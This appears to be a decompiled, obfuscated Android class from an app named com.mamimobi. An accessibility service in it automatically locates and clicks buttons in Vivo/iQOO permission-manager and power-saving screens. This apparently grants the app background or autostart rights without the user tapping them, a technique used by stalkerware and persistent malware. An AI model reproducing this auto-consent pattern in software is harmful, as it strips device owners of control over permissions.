package defpackage;

import android.os.Trace;
import android.view.accessibility.AccessibilityNodeInfo;
import com.mamimobi.AccessService;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: loaded from: classes.dex */
public final class ia implements Runnable {
    public final /* synthetic */ int E;

    public /* synthetic */ ia(int i) {
        this.E = i;
    }

    @Override // java.lang.Runnable
    public final void run() {
        List listX;
        AccessibilityNodeInfo accessibilityNodeInfoC0;
        switch (this.E) {
            case 0:
                if (AccessService.e0 == null || (listX = la.x("com.vivo.permissionmanager:id/move_btn")) == null) {
                    return;
                }
                la.j(0, listX, new is(16));
                return;
            case 1:
                AccessService accessService = AccessService.e0;
                if (accessService == null) {
                    return;
                }
                AccessibilityNodeInfo accessibilityNodeInfoC02 = la0.c0(accessService, "com.iqoo.powersaving:id/abnormal_power_manager_tv");
                AtomicBoolean atomicBoolean = la.q;
                if (accessibilityNodeInfoC02 != null) {
                    atomicBoolean.set(true);
                    la.g(accessibilityNodeInfoC02);
                    return;
                }
                AccessibilityNodeInfo accessibilityNodeInfoD0 = la0.d0(AccessService.e0, la0.A);
                if (accessibilityNodeInfoD0 != null) {
                    atomicBoolean.set(true);
                    la.i(accessibilityNodeInfoD0, new is(13));
                    return;
                }
                return;
            case 2:
                la.u(5);
                return;
            case 3:
                AccessService accessService2 = AccessService.e0;
                if (accessService2 == null || (accessibilityNodeInfoC0 = la0.c0(accessService2, "com.vivo.abe:id/vos_button_opt")) == null || accessibilityNodeInfoC0.isChecked()) {
                    return;
                }
                la.g(accessibilityNodeInfoC0);
                la.t.set(true);
                la.s();
                return;
            default:
                try {
                    int i = m11.a;
                    Trace.beginSection("EmojiCompat.EmojiCompatInitializer.run");
                    if (zs.j != null) {
                        zs.a().c();
                        break;
                    }
                    Trace.endSection();
                    return;
                } catch (Throwable th) {
                    int i2 = m11.a;
                    Trace.endSection();
                    throw th;
                }
        }
    }
}
